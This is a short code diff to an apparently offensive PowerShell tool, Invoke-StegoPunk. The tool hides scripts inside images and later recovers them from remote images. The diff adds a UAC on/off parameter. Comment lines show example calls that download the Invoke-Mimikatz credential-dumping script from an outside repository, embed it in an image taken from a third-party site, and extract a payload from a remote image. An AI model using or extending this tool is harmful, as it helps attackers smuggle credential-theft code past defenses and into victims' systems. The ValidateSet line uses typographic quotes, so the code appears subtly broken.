@@ -12,7 +12,9 @@ function Invoke-StegoPunk {
             [string]$Mode,
             [string]$Fileurl,
             [string]$ImageUrl,
-            [string]$ImageName = "$null"
+            [string]$ImageName = "$null",
+            [ValidateSet(“on”,”off”)]
+            [string]$b_UAC = "on"
        )  
 #invoke-stegopunk -mode encryption -fileurl 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1' -imageurl 'http://www.holidayguru.it/wp-content/uploads/2015/10/polignano_puglia.png' -imagename 'mix.png'                  
 #invoke-stegopunk -mode decryption -imageurl 'https://4.bp.blogspot.com/-e4-qZIRq0l0/VrNFM0tL1CI/AAAAAAAAAE4/nGUHo5FCs9U/s1600/qwerty.png'     
